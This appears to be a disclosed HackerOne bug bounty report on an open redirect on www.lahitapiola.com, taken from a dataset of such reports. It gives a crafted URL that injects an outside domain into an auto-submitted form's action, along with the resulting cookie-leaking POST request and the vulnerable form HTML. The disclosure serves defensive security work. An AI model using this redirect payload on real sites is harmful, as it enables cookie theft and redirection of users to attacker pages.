@@ -1,0 +1,102 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '190188'
+original_report_id: '190188'
+title: Open Redirect bypass and cookie leakage on www.lahitapiola.com
+weakness: Open Redirect
+team_handle: localtapiola
+created_at: '2016-12-10T20:03:38.820Z'
+disclosed_at: '2017-02-04T16:02:50.004Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 10
+tags:
+- hackerone
+- open-redirect
+---
+
+# Open Redirect bypass and cookie leakage on www.lahitapiola.com
+
+## Metadata
+
+- HackerOne Report ID: 190188
+- Weakness: Open Redirect
+- Program: localtapiola
+- Disclosed At: 2017-02-04T16:02:50.004Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+## Basic report information
+**Summary:** 
+
+An attacker is able to steal some of the cookies and redirect the user to his webpage.
+
+**Domain:** www.lahitapiola.com
+
+## Browsers / Apps Verified In:
+
+* Google Chrome (without user interaction)
+* Firefox (firefox will popup when is someone trying to authenticate you to another domain while using @domain.com)
+
+## Steps To Reproduce:
+
+
+
+  1. Go to URL `http://www.lahitapiola.fi///;@inexistantdomain.com` for example using Chrome
+  1. You will be redirected to inexistantdomain.com and cookies will be posted.
+
+## Additional material
+
+This request is made to attackers domain (some cookies seems to be missing):
+
+```
+POST / HTTP/1.1
+Host: inexistantdomain.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.lahitapiola.fi///;@inexistantdomain.com
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 660
+
+TS0159a426_id=3&TS0159a426_cr=09e76173015af5e7bf02c00a57fe63a7%3Aqssr%3A81ZOwrUa%3A237492148&TS0159a426_76=640000016737fa3330dfda2300584c5dfa00001c20f9c1be05c92fd035b4e8a5fb62ff970e31d763db00016737fa3330dfda2301584c5e4000001c202db1c0343ddc1ccb6e2b44e6b08a4787345e55e6&TS0159a426_86=b178ff9a47e9fe260193d97bc198c176dc9c97df9f86bac11f6be19555a2b67b3bb00cc14dba08cd9b8fd59f9f74d5985aed9421a6f3d009bff17be321f5ea9fe542d235e3fb4a2592269707a6135ab70cc0abfe31da91bf05bf8113e84aaf789d8b1b74573cf7f3b8c78519ba5726bb9817b9e7081b80a38465a9478a37c2d9f97fc2dab076bcec9a264377c4e63c8905dafbec3a7ee17dfaa40183f7&TS0159a426_md=1&TS0159a426_rf=0&TS0159a426_ct=0&TS0159a426_pd=0
+```
+
+And this is thanks to this form in web page of lahitapiola.com:
+
+```
+<form method="POST" action="%2f%2f%2f%3b@inexistantdomain.com"/><input type="hidden" name="TS0159a426_id" value="3"/><input type="hidden" name="TS0159a426_cr" value=""/><input type="hidden" name="TS0159a426_76" value="0"/><input type="hidden" name="TS0159a426_86" value="0"/><input type="hidden" name="TS0159a426_md" value="1"/><input type="hidden" name="TS0159a426_rf" value="0"/><input type="hidden" name="TS0159a426_ct" value="0"/><input type="hidden" name="TS0159a426_pd" value="0"/></form>
+```
+
+
+As you can see, our string injected in URL is in action element (encoded) "%2f%2f%2f%3b@inexistantdomain.com". Form is then auto-submitted or something :)
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
